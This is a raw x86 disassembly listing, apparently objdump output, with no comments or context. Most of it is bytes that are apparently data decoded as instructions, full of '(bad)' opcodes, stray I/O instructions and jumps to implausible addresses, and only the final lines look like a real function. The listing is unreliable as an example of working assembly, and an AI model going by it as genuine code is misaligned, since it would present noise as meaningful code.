  420d22:	div    BYTE PTR [edx-0x4199dafb]
  420d28:	sar    DWORD PTR [ebp+0x28e99db2],cl
  420d2e:	sbb    bh,BYTE PTR [eax]
  420d30:	add    cl,dl
  420d32:	mov    edx,0x165c6365
  420d37:	xor    ebp,ebx
  420d39:	add    ecx,edx
  420d3b:	add    eax,0x6e9d88d3
  420d40:	enter  0x98be,0xa2
  420d44:	loope  0x420d55
  420d46:	outs   dx,DWORD PTR ds:[esi]
  420d47:	sbb    DWORD PTR [edi+0x4b],ebx
  420d4a:	(bad)  [ebp+0x62]
  420d4d:	out    0x88,eax
  420d4f:	lds    ebx,FWORD PTR [edi+0x5b5bffee]
  420d55:	xchg   edx,eax
  420d56:	dec    edi
  420d57:	scas   al,BYTE PTR es:[edi]
  420d58:	adc    al,0x32
  420d5a:	inc    BYTE PTR [edi+0x4fbefd6a]
  420d60:	cmp    al,0xad
  420d62:	push   esp
  420d63:	sub    dh,BYTE PTR [ecx+ecx*8-0x5b]
  420d67:	ins    BYTE PTR es:[edi],dx
  420d68:	mov    edi,0xb3607d93
  420d6d:	loopne 0x420d39
  420d6f:	lock mov WORD PTR [eax+0x626af436],ss
  420d76:	sahf   
  420d77:	inc    esi
  420d78:	xchg   BYTE PTR [ecx],dl
  420d7a:	and    al,0xf8
  420d7c:	pop    ebx
  420d7d:	mov    al,ds:0xe9b1965b
  420d82:	mov    WORD PTR [ebx],ds
  420d84:	mov    bl,BYTE PTR [edx+ecx*1]
  420d87:	push   esp
  420d88:	cmp    ch,BYTE PTR [ebx-0x5]
  420d8b:	cmp    BYTE PTR [edi-0x16],bl
  420d8e:	xor    ecx,0xffffff9f
  420d91:	stos   DWORD PTR es:[edi],eax
  420d92:	xor    BYTE PTR [esi-0x3684d556],al
  420d98:	cmp    esi,ebx
  420d9a:	adc    BYTE PTR [ecx],dh
  420d9c:	push   0x6
  420d9e:	mov    ds:0xb9c6b09d,eax
  420da3:	mov    ds:0x48edaea1,eax
  420da8:	inc    ebx
  420da9:	sbb    esi,esi
  420dab:	or     dh,BYTE PTR [edx+0x40]
  420dae:	ret    0x5e0f
  420db1:	(bad)  
  420db2:	xor    eax,DWORD PTR [ebx-0x31e23e4c]
  420db8:	mov    eax,0x690d5a97
  420dbd:	cmc    
  420dbe:	mov    WORD PTR [ebp+0x29],es
  420dc1:	ret    
  420dc2:	jae    0x420d96
  420dc4:	fnstenv [ebp+0x9f6ec22]
  420dca:	mov    ebx,DWORD PTR [edi+edi*2+0x69]
  420dce:	mov    bl,0x95
  420dd0:	lods   eax,DWORD PTR ds:[esi]
  420dd1:	push   edi
  420dd2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420dd3:	test   eax,0xd7e34627
  420dd8:	aas    
  420dd9:	inc    ecx
  420dda:	rol    DWORD PTR [edx+0x37ec13c3],cl
  420de0:	inc    edi
  420de1:	loope  0x420e04
  420de3:	mov    cl,0x68
  420de5:	push   edi
  420de6:	enter  0x1e67,0x56
  420dea:	popa   
  420deb:	sub    eax,0x8b3b31c6
  420df0:	xchg   DWORD PTR [esi+0x6b0eebbe],ebx
  420df6:	cmp    BYTE PTR [edi+0xf],cl
  420df9:	jmp    0xcc7f9179
  420dfe:	dec    eax
  420dff:	je     0x420e6f
  420e01:	cmp    esp,eax
  420e03:	lods   eax,DWORD PTR ds:[esi]
  420e04:	dec    esi
  420e05:	sbb    edi,DWORD PTR [ebp-0x35]
  420e08:	sub    BYTE PTR [esi-0x3b],bh
  420e0b:	mov    DWORD PTR ds:0xaf1de51a,edx
  420e11:	js     0x420e28
  420e13:	pop    ecx
  420e14:	ins    BYTE PTR es:[edi],dx
  420e15:	daa    
  420e16:	rcl    edi,0xa8
  420e19:	jno    0x420e1e
  420e1b:	ss out 0xe2,al
  420e1e:	vpmaxuq zmm5{k2},zmm0,QWORD PTR [ebp-0x37e00486]{1to8}
  420e28:	test   BYTE PTR [ebx+0xf],cl
  420e2b:	xlat   BYTE PTR ds:[ebx]
  420e2c:	and    eax,0x37b1ef75
  420e31:	push   ebx
  420e32:	out    0xad,eax
  420e34:	and    al,0xcb
  420e36:	repnz dec ebp
  420e38:	or     ah,BYTE PTR [ebx-0x7c75bb1a]
  420e3e:	sub    al,0x6
  420e40:	in     al,dx
  420e41:	push   edi
  420e42:	out    0xdc,al
  420e44:	lds    edi,FWORD PTR [esi]
  420e46:	xor    cl,BYTE PTR [ecx]
  420e48:	pop    eax
  420e49:	mov    eax,0xbde9489e
  420e4e:	aas    
  420e4f:	mov    WORD PTR [eax],ds
  420e51:	and    eax,0xe0f6555d
  420e56:	mov    WORD PTR [ebx+0x35],gs
  420e59:	dec    ebx
  420e5a:	cmp    dh,BYTE PTR [eax-0x6d]
  420e5d:	push   ecx
  420e5e:	sbb    BYTE PTR [edx+0x5889ed56],bh
  420e64:	push   cs
  420e65:	jp     0x420e81
  420e67:	test   DWORD PTR [ebx+0x14],edx
  420e6a:	mov    esi,0x947ce982
  420e6f:	xchg   edi,eax
  420e70:	push   edi
  420e71:	in     al,0x58
  420e73:	dec    ebp
  420e74:	(bad)  
  420e75:	adc    DWORD PTR [ebp-0x6961fd4b],esi
  420e7b:	sub    eax,0xc0fab2a1
  420e80:	sub    dh,ch
  420e82:	aad    0x2d
  420e84:	scas   eax,DWORD PTR es:[edi]
  420e85:	fwait
  420e86:	cmc    
  420e87:	push   ss
  420e88:	jns    0x420ec0
  420e8a:	clc    
  420e8b:	mov    dh,0x8b
  420e8d:	pop    eax
  420e8e:	sub    eax,0x7fccd327
  420e93:	jecxz  0x420eff
  420e95:	add    al,0x3d
  420e97:	(bad)  
  420e98:	mov    al,ds:0xc6ed63f1
  420e9d:	push   es
  420e9e:	test   ebp,ebp
  420ea0:	inc    ebp
  420ea1:	nop    DWORD PTR [edi-0x3]
  420ea5:	sub    al,0x9
  420ea7:	mov    eax,0xe0c65c33
  420eac:	and    edx,ebp
  420eae:	adc    dl,bl
  420eb0:	xchg   ecx,eax
  420eb1:	and    al,0x80
  420eb3:	sbb    esp,DWORD PTR [edi+edi*2+0x2d]
  420eb7:	mov    edx,0x2e1c8cc4
  420ebc:	add    eax,0xe6c0136e
  420ec1:	arpl   WORD PTR [edi+0x4a],si
  420ec4:	mov    edi,ebp
  420ec6:	(bad)  
  420ec7:	mov    esi,0xef1df52f
  420ecc:	jecxz  0x420f05
  420ece:	inc    eax
  420ecf:	outs   dx,BYTE PTR ds:[esi]
  420ed0:	push   esp
  420ed1:	call   0xe61b1988
  420ed6:	ffree  st(2)
  420ed8:	push   edx
  420ed9:	lea    edi,[ecx-0x53a696f2]
  420edf:	neg    al
  420ee1:	jbe    0x420e68
  420ee3:	push   ds
  420ee4:	inc    ebx
  420ee5:	xor    al,al
  420ee7:	rcl    DWORD PTR [eax],1
  420ee9:	and    bh,BYTE PTR [edi+ecx*8+0x649b8b7b]
  420ef0:	les    ecx,FWORD PTR [esi]
  420ef2:	inc    ecx
  420ef3:	out    0x57,eax
  420ef5:	adc    al,0x59
  420ef7:	mov    al,0x6f
  420ef9:	cmp    eax,0x3f86c23b
  420efe:	sbb    DWORD PTR [edi+edx*2],esp
  420f01:	pop    ds
  420f02:	ret    0x8ba4
  420f05:	aas    
  420f06:	dec    ecx
  420f07:	sbb    ebx,DWORD PTR [ecx]
  420f09:	sub    eax,0x2e394418
  420f0e:	mov    ds,WORD PTR [edi+0x22381b37]
  420f14:	(bad)  
  420f15:	adc    DWORD PTR [edi-0x193dc6d3],edi
  420f1b:	add    ecx,ebx
  420f1d:	cmp    al,BYTE PTR [eax+0x74cd1648]
  420f23:	rol    BYTE PTR [edx+0x7b0c47f6],cl
  420f29:	jo     0x420f5d
  420f2b:	repz jge 0x420f06
  420f2e:	adc    al,0xb2
  420f30:	aas    
  420f31:	xor    ebx,DWORD PTR [ecx]
  420f33:	loop   0x420ec0
  420f35:	dec    edx
  420f36:	or     dl,BYTE PTR [ebp-0x1f0ea137]
  420f3c:	or     dl,bh
  420f3e:	and    dh,BYTE PTR [esi+0x24]
  420f41:	pop    ebp
  420f42:	and    al,0xd8
  420f44:	mov    esp,0x90ba3aff
  420f49:	iret   
  420f4a:	and    ebp,DWORD PTR [edi+eiz*4-0x28]
  420f4e:	lock jmp 0x420f74
  420f51:	xchg   DWORD PTR [edx],eax
  420f53:	fs sbb esi,ecx
  420f56:	jp     0x420f73
  420f58:	xor    esp,DWORD PTR [edi]
  420f5a:	rol    BYTE PTR [edx-0x3b],1
  420f5d:	push   ecx
  420f5e:	jmp    0xfdea:0x53d692f
  420f65:	dec    edx
  420f66:	cmc    
  420f67:	sub    BYTE PTR [edx],ah
  420f69:	shr    DWORD PTR [esi+0x50198601],cl
  420f6f:	data16 (bad) 
  420f71:	jmp    0x420fa5
  420f73:	lahf   
  420f74:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420f75:	enter  0x4379,0x56
  420f79:	dec    ebp
  420f7a:	sar    BYTE PTR [edx],0xd3
  420f7d:	in     al,0xc1
  420f7f:	pushf  
  420f80:	push   ebp
  420f81:	repz retf 0x49c1
  420f85:	mov    al,0x33
  420f87:	xor    al,0x1
  420f89:	test   DWORD PTR [ecx+0x5f],ebx
  420f8c:	mov    esp,0xc2d263ca
  420f91:	lods   eax,DWORD PTR ds:[esi]
  420f92:	cs xchg ecx,eax
  420f94:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420f95:	neg    BYTE PTR [ecx-0x1e]
  420f98:	test   al,0xb9
  420f9a:	cmp    dl,BYTE PTR [ecx-0x264e6d21]
  420fa0:	cmc    
  420fa1:	data16 test BYTE PTR [ebp+0x164a7ce7],0xf5
  420fa9:	daa    
  420faa:	jnp    0x420fc7
  420fac:	jmp    0x420fd8
  420fae:	cmp    BYTE PTR [edi+0x3e8a356c],ch
  420fb4:	sbb    eax,0xe1341cb6
  420fb9:	test   BYTE PTR [ebx+0x47],bl
  420fbc:	sub    edi,DWORD PTR [ebp-0x2162d439]
  420fc2:	mov    edx,0xb010f5
  420fc7:	cdq    
  420fc8:	das    
  420fc9:	jns    0x420fd4
  420fcb:	retf   0x74a5
  420fce:	cmp    DWORD PTR [edi+0x14],edx
  420fd1:	add    eax,0xbd5dcbd7
  420fd6:	in     eax,dx
  420fd7:	call   0x68b00344
  420fdc:	imul   ecx,DWORD PTR [ebx],0x45de2e19
  420fe2:	lods   al,BYTE PTR ds:[esi]
  420fe3:	aaa    
  420fe4:	or     ch,ch
  420fe6:	jb     0x420faa
  420fe8:	mov    dh,0x4c
  420fea:	mov    esi,0xb2cae7cd
  420fef:	dec    eax
  420ff0:	cli    
  420ff1:	shl    DWORD PTR [eax-0x4a],0xbd
  420ff5:	popa   
  420ff6:	adc    bh,bl
  420ff8:	jp     0x420fa6
  420ffa:	jne    0x421029
  420ffc:	nop
  420ffd:	mov    ah,0x81
  420fff:	pusha  
  421000:	add    BYTE PTR [ebp+edi*8-0x2b],dl
  421004:	cmp    DWORD PTR [esi-0x265b2c2b],eax
  42100a:	xor    ebx,edi
  42100c:	dec    esi
  42100d:	push   eax
  42100e:	dec    ecx
  42100f:	mov    ebp,DWORD PTR [ebx-0x68]
  421012:	cs cmp ch,BYTE PTR ds:[ecx+0x112ef571]
  42101a:	inc    ebp
  42101b:	or     dh,BYTE PTR [edx-0x13794608]
  421021:	inc    esi
  421022:	mov    bh,0x2a
  421024:	dec    ecx
  421025:	pop    ds
  421026:	or     DWORD PTR [edx+0x1f],esp
  421029:	jmp    0xd5a1:0x5cc7f410
  421030:	(bad)  
  421031:	hlt    
  421032:	pushf  
  421033:	data16 (bad) 
  421036:	int3   
  421037:	adc    eax,0x9e9688f4
  42103c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42103d:	leave  
  42103e:	push   esp
  42103f:	repz out 0x24,al
  421042:	pop    es
  421043:	or     DWORD PTR [ecx+0x5728c37e],eax
  421049:	stos   DWORD PTR es:[edi],eax
  42104a:	and    al,0x18
  42104c:	sbb    ecx,esp
  42104e:	mov    bl,0x8f
  421050:	sub    ah,BYTE PTR [ebx+0x345a180c]
  421056:	push   cs
  421057:	push   esi
  421058:	sbb    edi,edi
  42105a:	xchg   ebp,eax
  42105b:	out    dx,al
  42105c:	das    
  42105d:	pop    ebp
  42105e:	mov    esp,0x56936ab3
  421063:	(bad)
  421066:	dec    eax
  421067:	and    ebp,DWORD PTR [edi+0x542ae5f9]
  42106d:	jge    0x42106f
  42106f:	mov    eax,ds:0x6922cf6b
  421074:	inc    edi
  421075:	adc    ecx,DWORD PTR [edi]
  421077:	or     dh,BYTE PTR ds:0xc91e5219
  42107d:	cmc    
  42107e:	sub    ecx,eax
  421080:	push   0x6a
  421082:	lods   al,BYTE PTR ds:[esi]
  421083:	xchg   DWORD PTR [ebx+0x1bf49b6e],ebp
  421089:	push   esi
  42108a:	push   ds
  42108b:	adc    eax,DWORD PTR [ebp-0xf7e2fd4]
  421091:	lahf   
  421092:	int    0x77
  421094:	fucomi st,st(5)
  421096:	mov    eax,0x2d8f2c9
  42109b:	neg    DWORD PTR [ebx+0x69]
  42109e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42109f:	das    
  4210a0:	aas    
  4210a1:	sub    cl,ch
  4210a3:	mov    dl,0x2
  4210a5:	dec    eax
  4210a6:	loop   0x42107c
  4210a8:	in     eax,dx
  4210a9:	dec    eax
  4210aa:	dec    esi
  4210ab:	popf   
  4210ac:	fcmove st,st(2)
  4210ae:	ins    BYTE PTR es:[edi],dx
  4210af:	or     eax,0xde01e7d2
  4210b4:	mov    dh,0x92
  4210b6:	jae    0x421065
  4210b8:	(bad)  
  4210b9:	ror    esi,cl
  4210bb:	icebp  
  4210bc:	outs   dx,BYTE PTR ds:[esi]
  4210bd:	add    BYTE PTR [esi],cl
  4210bf:	popa   
  4210c0:	jae    0x4210e9
  4210c2:	call   0x4cb42433
  4210c7:	sbb    BYTE PTR [edx],bl
  4210c9:	mov    edx,0xcc10eb63
  4210ce:	cmp    ebx,eax
  4210d0:	ins    DWORD PTR es:[edi],dx
  4210d1:	jge    0x4210f2
  4210d3:	shl    BYTE PTR [ebx],0x68
  4210d6:	jb     0x4210ba
  4210d8:	pop    esp
  4210d9:	fisttp WORD PTR [ebx]
  4210db:	sub    DWORD PTR [ebx],ecx
  4210dd:	in     eax,0x2a
  4210df:	xor    ch,cl
  4210e1:	(bad)  
  4210e2:	mov    edi,0x1bc41849
  4210e7:	xor    eax,0x2ef75cb1
  4210ec:	fwait
  4210ed:	mov    ecx,DWORD PTR [ebx+ebp*4]
  4210f0:	lds    edx,FWORD PTR [edi+0x73cce4d1]
  4210f6:	mov    eax,0x82ea8751
  4210fb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4210fc:	and    BYTE PTR [eax],ah
  4210fe:	(bad)  
  4210ff:	aam    0xe7
  421101:	add    al,0x6a
  421103:	push   0x4d79adb2
  421108:	loopne 0x4210c0
  42110a:	mov    al,0x31
  42110c:	inc    edx
  42110d:	mov    dh,0xc8
  42110f:	cdq    
  421110:	in     al,0x51
  421112:	inc    edi
  421113:	jb     0x42114b
  421115:	fs push edi
  421117:	push   ds
  421118:	xchg   ecx,eax
  421119:	pop    ebp
  42111a:	or     eax,0x7181acd2
  42111f:	push   cs
  421120:	inc    ebp
  421121:	fdiv   QWORD PTR [eax]
  421123:	inc    edi
  421124:	push   eax
  421125:	mov    DWORD PTR [ebx],edi
  421127:	nop
  421128:	out    0x19,eax
  42112a:	int3   
  42112b:	adc    cl,ah
  42112d:	test   al,0x24
  42112f:	loopne 0x42112a
  421131:	lock push edx
  421133:	lods   eax,DWORD PTR ds:[esi]
  421134:	push   0xf0cb5739
  421139:	in     al,0xdd
  42113b:	mov    ecx,0xea91cbdd
  421140:	add    DWORD PTR [edi],eax
  421142:	ret    
  421143:	mov    ecx,0x24d345bd
  421148:	or     bl,BYTE PTR [edi+eax*8-0x6aeeca77]
  42114f:	pop    esp
  421150:	rol    BYTE PTR [edx+0x14],1
  421153:	cmp    dh,BYTE PTR [ecx]
  421155:	retf   
  421156:	(bad)  
  421157:	jl     0x42110a
  421159:	push   eax
  42115a:	mov    eax,ds:0x1a413eac
  42115f:	mov    esp,0xf4042c25
  421164:	test   edx,ecx
  421166:	add    dh,dh
  421168:	out    dx,eax
  421169:	xchg   esp,eax
  42116a:	in     al,0x7e
  42116c:	adc    BYTE PTR [esi],dh
  42116e:	stc    
  42116f:	bt     esp,eax
  421172:	mov    ch,BYTE PTR [edx]
  421174:	push   esp
  421175:	push   es
  421176:	push   ecx
  421177:	in     al,dx
  421178:	mov    ds:0xc9fd8dcb,eax
  42117d:	push   cs
  42117e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42117f:	jnp    0x4211e7
  421181:	xchg   ebx,eax
  421182:	pop    edx
  421183:	mov    esp,0x8dbd39ea
  421188:	mov    dh,0x49
  42118a:	ds loope 0x42118c
  42118d:	sbb    BYTE PTR [ebx-0x38],0x43
  421191:	mov    eax,ds:0xe0b8b551
  421196:	jo     0x4211d8
  421198:	in     eax,dx
  421199:	inc    esi
  42119a:	shl    DWORD PTR [ecx-0x41],0x13
  42119e:	fcomp  QWORD PTR [ebp+0x20]
  4211a1:	inc    esi
  4211a2:	or     edi,DWORD PTR [edi+0x7f]
  4211a5:	nop
  4211a6:	add    BYTE PTR [edi-0x71adceef],bh
  4211ac:	cli    
  4211ad:	xlat   BYTE PTR ds:[ebx]
  4211ae:	out    dx,al
  4211af:	mov    esi,0x7faeeaca
  4211b4:	mov    cl,0xf8
  4211b6:	imul   ebx,DWORD PTR [ebx+esi*8],0x6e1def52
  4211bd:	sub    eax,DWORD PTR [ebx+0x71]
  4211c0:	fmul   DWORD PTR [ebp*2+0x3061b3dc]
  4211c7:	jae    0x421179
  4211c9:	stc    
  4211ca:	int    0x87
  4211cc:	mov    esp,0xa81da5b9
  4211d1:	sbb    edx,DWORD PTR [esi+0x5e]
  4211d4:	ins    DWORD PTR es:[edi],dx
  4211d5:	cmp    eax,0x8fd1ad3a
  4211da:	add    bh,al
  4211dc:	or     cl,BYTE PTR [esi-0x4a30d08b]
  4211e2:	jmp    DWORD PTR [ecx]
  4211e4:	popa   
  4211e5:	sub    ecx,ebp
  4211e7:	sbb    cl,BYTE PTR [ecx+0x3b]
  4211ea:	repz das 
  4211ec:	sbb    al,0x24
  4211ee:	sbb    al,0xe5
  4211f0:	xchg   esp,eax
  4211f1:	mov    edi,0x29b03664
  4211f6:	leave  
  4211f7:	push   ebx
  4211f8:	xor    DWORD PTR [esi+0x3c],0x122ed82
  4211ff:	mov    al,0x46
  421201:	jns    0x4211fa
  421203:	loop   0x42124d
  421205:	and    bl,BYTE PTR [edi+ecx*4+0x2ded2621]
  42120c:	sbb    BYTE PTR [ecx+ecx*1],dl
  42120f:	das    
  421210:	or     DWORD PTR [eax-0x40903f4c],edi
  421216:	mov    al,ds:0xea8e8d6c
  42121b:	leave  
  42121c:	mov    DWORD PTR [esp+edi*1+0x54],edi
  421220:	in     eax,0x8d
  421222:	pop    es
  421223:	(bad)  [ebx]
  421225:	xor    ecx,DWORD PTR [edx]
  421227:	mov    edx,0xbc80d4e3
  42122c:	xchg   dl,ch
  42122e:	mov    eax,0xc5da890f
  421233:	pusha  
  421234:	mov    ecx,0x9b0b47a6
  421239:	rcr    BYTE PTR [edi-0x37],cl
  42123c:	nop
  42123d:	dec    esi
  42123e:	jnp    0x421227
  421240:	shl    bh,cl
  421242:	cdq    
  421243:	in     al,0x7b
  421245:	dec    edi
  421246:	push   0x19
  421248:	sbb    bh,BYTE PTR cs:[eax+ebx*4+0x3c3bd0cd]
  421250:	imul   ebp,DWORD PTR [ecx],0x10f6e842
  421256:	daa    
  421257:	arpl   WORD PTR [eax-0x45f7a72e],cx
  42125d:	ds pop esp
  42125f:	xchg   DWORD PTR [edx+esi*4+0xe],edi
  421263:	add    esi,DWORD PTR [edx-0x78cfda9d]
  421269:	repz sub esi,DWORD PTR [ebx+eiz*4]
  42126d:	xchg   BYTE PTR [edi+0x5f],bh
  421270:	fwait
  421271:	push   ebx
  421272:	adc    ebx,DWORD PTR [edi]
  421274:	bnd call 0xcf831f95
  42127a:	push   ds
  42127b:	aad    0xca
  42127d:	mov    bh,0x36
  42127f:	xor    dh,dl
  421281:	test   BYTE PTR [eax-0x719736fd],bh
  421287:	mov    dh,0xb1
  421289:	pop    eax
  42128a:	inc    ebp
  42128b:	gs stos BYTE PTR es:[edi],al
  42128d:	jle    0x42128c
  42128f:	dec    ebp
  421290:	add    al,0xea
  421292:	repnz sub DWORD PTR [edi-0x21],ebx
  421296:	(bad)  
  421297:	nop
  421298:	pop    esp
  421299:	out    0x12,eax
  42129b:	(bad)  
  42129c:	rep outs dx,DWORD PTR ds:[esi]
  42129e:	mov    ebp,0xb72bfdeb
  4212a3:	or     esi,ebx
  4212a5:	fiadd  WORD PTR [ebx-0x32]
  4212a8:	rcr    esi,cl
  4212aa:	mov    dh,0xc0
  4212ac:	or     BYTE PTR [esi],bh
  4212ae:	xchg   edx,eax
  4212af:	inc    esi
  4212b0:	shl    dl,1
  4212b2:	mov    ebx,0x5518a7f6
  4212b7:	je     0x421312
  4212b9:	xor    al,0x54
  4212bb:	das    
  4212bc:	jg     0x421322
  4212be:	dec    edi
  4212bf:	ror    DWORD PTR [ebp+0x694a10dc],0xf6
  4212c6:	mov    BYTE PTR [edi+0x25],ah
  4212c9:	retf   0xec53
  4212cc:	sar    DWORD PTR [edi],1
  4212ce:	adc    eax,0x1a44313e
  4212d3:	inc    ebx
  4212d4:	mov    ebp,0x2564b42a
  4212d9:	push   eax
  4212da:	dec    esi
  4212db:	push   edi
  4212dc:	jae    0x421316
  4212de:	ins    DWORD PTR es:[edi],dx
  4212df:	sahf   
  4212e0:	dec    ecx
  4212e1:	inc    esp
  4212e2:	mov    ebp,0x24f0eb7f
  4212e7:	jge    0x4212ac
  4212e9:	sbb    eax,0xca5e1712
  4212ee:	push   edx
  4212ef:	xor    ah,BYTE PTR [esi+0x60]
  4212f2:	or     BYTE PTR [eax],bl
  4212f4:	add    al,0x5f
  4212f6:	clc    
  4212f7:	jmp    0xb0dabaa8
  4212fc:	sub    al,0x1c
  4212fe:	inc    edi
  4212ff:	leave  
  421300:	add    edx,DWORD PTR [ebp+0x60]
  421303:	ret    0x346
  421306:	push   es
  421307:	pusha  
  421308:	push   ebp
  421309:	and    al,0xb0
  42130b:	sub    bl,BYTE PTR [ecx]
  42130d:	aad    0x63
  42130f:	push   edi
  421310:	add    BYTE PTR [edx+eiz*4],al
  421313:	adc    al,0xe5
  421315:	jno    0x421316
  421317:	push   0xfffffff4
  421319:	cmp    eax,DWORD PTR [esi-0x2f]
  42131c:	jnp    0x4212c6
  42131e:	push   esi
  42131f:	xor    dl,BYTE PTR [ecx+0x7592ea15]
  421325:	add    eax,0xe06470fa
  42132a:	ins    BYTE PTR es:[edi],dx
  42132b:	xor    al,0x53
  42132d:	loop   0x421336
  42132f:	in     al,0xc4
  421331:	pop    edx
  421332:	jbe    0x4212ea
  421334:	retf   
  421335:	or     eax,DWORD PTR [eax+0x7e]
  421338:	das    
  421339:	dec    esi
  42133a:	and    eax,0xf68fb46c
  42133f:	mov    ebp,0x516d06b8
  421344:	aaa    
  421345:	not    BYTE PTR [ebp-0x55438033]
  42134b:	xchg   ecx,eax
  42134c:	mov    WORD PTR [eax],gs
  42134e:	add    DWORD PTR [eax],ecx
  421350:	inc    esi
  421351:	mov    ch,0x31
  421353:	and    eax,0x45e1bc77
  421358:	mov    ch,0xf5
  42135a:	xor    bl,ah
  42135c:	cmp    ch,dh
  42135e:	add    BYTE PTR ds:0x66d8f789,cl
  421364:	pop    ds
  421365:	and    edx,DWORD PTR [esi+0x523a9fcd]
  42136b:	cs cmp ch,bl
  42136e:	sbb    al,0x2
  421370:	xor    DWORD PTR [edx+ecx*1-0x34],ecx
  421374:	adc    ebx,DWORD PTR [ecx]
  421376:	repz xchg esp,eax
  421378:	sub    ecx,DWORD PTR [ebx]
  42137a:	retf   
  42137b:	cwde   
  42137c:	and    edi,DWORD PTR [eax+edx*1-0x5f]
  421380:	inc    ebx
  421381:	out    0x36,eax
  421383:	fimul  WORD PTR [ebx]
  421385:	cmc    
  421386:	and    eax,0x1b88f2d8
  42138b:	(bad)
  42138f:	inc    edx
  421390:	data16 inc si
  421393:	(bad)  
  421394:	mov    al,ds:0x1fd15c9f
  421399:	push   eax
  42139a:	int    0x9b
  42139c:	ins    DWORD PTR es:[edi],dx
  42139d:	outs   dx,BYTE PTR ds:[esi]
  42139e:	(bad)  
  42139f:	mov    dh,0x17
  4213a1:	ja     0x4213a0
  4213a3:	scas   al,BYTE PTR es:[edi]
  4213a4:	fdivp  st(1),st
  4213a6:	adc    ecx,DWORD PTR [ebx-0xe9b3bd4]
  4213ac:	stc    
  4213ad:	aam    0x83
  4213af:	test   BYTE PTR [eiz*4-0x14aef4a1],dl
  4213b6:	inc    edx
  4213b7:	out    0xa1,eax
  4213b9:	jge    0x421352
  4213bb:	fst    st(7)
  4213bd:	sub    eax,0x7fac54a9
  4213c2:	mov    ebp,esi
  4213c4:	xor    BYTE PTR [ebx],ah
  4213c6:	loope  0x421415
  4213c8:	or     eax,0x6a83d4
  4213cd:	(bad)  
  4213ce:	fwait
  4213cf:	xchg   ecx,eax
  4213d0:	add    eax,ecx
  4213d2:	dec    BYTE PTR [edi+0x2a7a335b]
  4213d8:	lods   al,BYTE PTR ds:[esi]
  4213d9:	or     al,0xdd
  4213db:	sub    ah,BYTE PTR [edi+0x50516531]
  4213e1:	das    
  4213e2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4213e3:	xchg   edi,eax
  4213e4:	or     cl,BYTE PTR [esi-0x187eb285]
  4213ea:	xor    eax,esi
  4213ec:	popa   
  4213ed:	in     al,dx
  4213ee:	lods   al,BYTE PTR ds:[esi]
  4213ef:	iret   
  4213f0:	cmp    eax,0x2e0426ae
  4213f5:	or     eax,edi
  4213f7:	sub    ebx,DWORD PTR [ebp-0x4f]
  4213fa:	mov    dl,0x91
  4213fc:	pushf  
  4213fd:	jmp    0x17f116ec
  421402:	je     0x421402
  421404:	adc    DWORD PTR [ebx+eiz*2+0x417a098e],ecx
  42140b:	push   0xffffff95
  42140d:	mov    cl,0xf1
  42140f:	jge    0x421463
  421411:	adc    DWORD PTR [esi+eax*1+0x1e],esi
  421415:	xor    al,0x8a
  421417:	loopne 0x42147d
  421419:	(bad)  
  42141a:	mov    ch,0xc7
  42141c:	es mov dh,0xcf
  42141f:	add    bl,dh
  421421:	jbe    0x42141c
  421423:	sub    bl,BYTE PTR [edx]
  421425:	mov    esi,0x1f778215
  42142a:	aaa    
  42142b:	jmp    0x998d:0xea6ed7b7
  421432:	xor    BYTE PTR [edx+0x54],al
  421435:	push   edi
  421436:	add    DWORD PTR [esi+edi*1-0x854215e],esp
  42143d:	test   bl,0x54
  421440:	jb     0x421439
  421442:	test   BYTE PTR [edx+0x2e9b7f69],0xaa
  421449:	fsubr  QWORD PTR [edi-0x2c]
  42144c:	fmul   DWORD PTR [edi+0x23]
  42144f:	push   eax
  421450:	jge    0x42148a
  421452:	dec    edx
  421453:	test   DWORD PTR [edx-0x1ebc9dc7],0x10cc14f3
  42145d:	inc    edi
  42145e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42145f:	mov    dl,0xd
  421461:	stos   DWORD PTR es:[edi],eax
  421462:	cdq    
  421463:	jge    0x42142c
  421465:	adc    al,0xb6
  421467:	adc    BYTE PTR [edi+0x5c],ch
  42146a:	cmp    cl,BYTE PTR [ebp-0x27f9de6d]
  421470:	or     BYTE PTR [ecx-0x74],0x5d
  421474:	fsubr  QWORD PTR [edi-0x3fc0d606]
  42147a:	sahf   
  42147b:	sub    edi,DWORD PTR [ebp+esi*1+0x40fa6a24]
  421482:	enter  0x4791,0xe4
  421486:	popa   
  421487:	xchg   BYTE PTR [ecx],al
  421489:	into   
  42148a:	repnz lds ecx,FWORD PTR [ecx-0x6a]
  42148e:	ja     0x421444
  421490:	inc    esp
  421491:	and    esp,DWORD PTR [ebx+0x61]
  421494:	or     BYTE PTR [edi+0x24],al
  421497:	cmp    eax,0x5c9cf514
  42149c:	add    al,0x6b
  42149e:	ror    BYTE PTR [edx+eax*2+0x2438d079],0xfe
  4214a6:	mov    ds:0x75430603,eax
  4214ab:	outs   dx,BYTE PTR ds:[esi]
  4214ac:	(bad)
  4214b0:	aam    0x97
  4214b2:	pop    ebp
  4214b3:	mov    ?,WORD PTR [edi-0x3f]
  4214b6:	fcom   st(0)
  4214b8:	ret    0x6e0a
  4214bb:	shl    dl,cl
  4214bd:	pop    edi
  4214be:	xchg   ecx,eax
  4214bf:	test   DWORD PTR [esi+ebp*4+0x237cd102],ebx
  4214c6:	xor    eax,0xc033f291
  4214cb:	ret    
  4214cc:	nop
  4214cd:	nop
  4214ce:	nop
  4214cf:	nop
  4214d0:	push   ecx
  4214d1:	push   ebp
  4214d2:	mov    ebp,DWORD PTR [esp+0x10]
  4214d6:	xor    eax,eax
  4214d8:	test   ebp,ebp
  4214da:	push   esi
  4214db:	mov    DWORD PTR [esp+0x8],eax
  4214df:	mov    esi,0xfffffffd
  4214e4:	je     0x421546
  4214e6:	push   ebx
  4214e7:	push   edi
  4214e8:	mov    edi,DWORD PTR [esp+0x18]
  4214ec:	mov    DWORD PTR [esp+0x1c],0x1
  4214f4:	mov    cl,BYTE PTR [esi+ebp*1+0x3]
  4214f8:	add    esi,0x2
  4214fb:	inc    esi
  4214fc:	mov    BYTE PTR [esi+edi*1],cl
  4214ff:	mov    ecx,DWORD PTR [esp+0x24]
